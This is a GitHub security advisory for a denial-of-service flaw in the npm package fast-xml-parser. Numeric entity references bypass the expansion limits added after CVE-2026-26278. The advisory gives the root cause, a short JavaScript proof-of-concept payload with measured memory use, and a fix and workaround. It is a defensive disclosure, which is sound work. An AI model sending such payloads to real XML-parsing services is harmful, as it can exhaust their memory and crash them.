# [H] fast-xml-parser affected by numeric entity expansion bypassing all entity expansion limits (incomplete fix for CVE-2026-26278)

## Summary
Severity: High
Advisory: GHSA-8gc5-j5rx-235r
CVE: CVE-2026-33036
CWE: CWE-776
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-8gc5-j5rx-235r
Type: github-advisory

## Affected
- npm: `fast-xml-parser` — affected >=5.0.0 <5.5.6
- npm: `fast-xml-parser` — affected >=4.0.0-beta.3 <4.5.5

## Details
## Summary

The fix for CVE-2026-26278 added entity expansion limits (`maxTotalExpansions`, `maxExpandedLength`, `maxEntityCount`, `maxEntitySize`) to prevent XML entity expansion Denial of Service. However, these limits are only enforced for DOCTYPE-defined entities. **Numeric character references** (`&#NNN;` and `&#xHH;`) and standard XML entities (`&lt;`, `&gt;`, etc.) are processed through a separate code path that does NOT enforce any expansion limits.

An attacker can use massive numbers of numeric entity references to completely bypass all configured limits, causing excessive memory allocation and CPU consumption.

## Affected Versions

fast-xml-parser v5.x through v5.5.3 (and likely v5.5.5 on npm)

## Root Cause

In `src/xmlparser/OrderedObjParser.js`, the `replaceEntitiesValue()` function has two separate entity replacement loops:

1. **Lines 638-670**: DOCTYPE entities — expansion counting with `entityExpansionCount` and `currentExpandedLength` tracking. This was the CVE-2026-26278 fix.
2. **Lines 674-677**: `lastEntities` loop — replaces standard entities including `num_dec` (`/&#([0-9]{1,7});/g`) and `num_hex` (`/&#x([0-9a-fA-F]{1,6});/g`). **This loop has NO expansion counting at all.**

The numeric entity regex replacements at lines 97-98 are part of `lastEntities` and go through the uncounted loop, completely bypassing the CVE-2026-26278 fix.

## Proof of Concept

```javascript
const { XMLParser } = require('fast-xml-parser');

// Even with strict explicit limits, numeric entities bypass them
const parser = new XMLParser({
  processEntities: {
    enabled: true,
    maxTotalExpansions: 10,
    maxExpandedLength: 100,
    maxEntityCount: 1,
    maxEntitySize: 10
  }
});

// 100K numeric entity references — should be blocked by maxTotalExpansions=10
const xml = `<root>${'&#65;'.repeat(100000)}</root>`;
const result = parser.parse(xml);

// Output: 500,000 chars — bypasses maxExpandedLength=100 completely
console.log('Output length:', result.root.length);  // 500000
console.log('Expected max:', 100);  // limit was 100
```

**Results:**
- 100K `&#65;` references → 500,000 char output (5x default maxExpandedLength of 100,000)
- 1M references → 5,000,000 char output, ~147MB memory consumed
- Even with `maxTotalExpansions=10` and `maxExpandedLength=100`, 10K references produce 50,000 chars
- Hex entities (`&#x41;`) exhibit the same bypass

## Impact

**Denial of Service** — An attacker who can provide XML input to applications using fast-xml-parser can cause:
- Excessive memory allocation (147MB+ for 1M entity references)
- CPU consumption during regex replacement
- Potential process crash via OOM

This is particularly dangerous because the application developer may have explicitly configured strict entity expansion limits believing they are protected, while numeric entities silently bypass all of them.

## Suggested Fix

Apply the same `entityExpansionCount` and `currentExpandedLength` tracking to the `lastEntities` loop (lines 674-677) and the HTML entities loop (lines 680-686), similar to how DOCTYPE entities are tracked at lines 638-670.

## Workaround

Set `htmlEntities:false`

## References
- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-8gc5-j5rx-235r
- https://nvd.nist.gov/vuln/detail/CVE-2026-33036
- https://github.com/NaturalIntelligence/fast-xml-parser/commit/bd26122c838e6a55e7d7ac49b4ccc01a49999a01
- https://github.com/NaturalIntelligence/fast-xml-parser
- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v4.5.5
- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.5.6
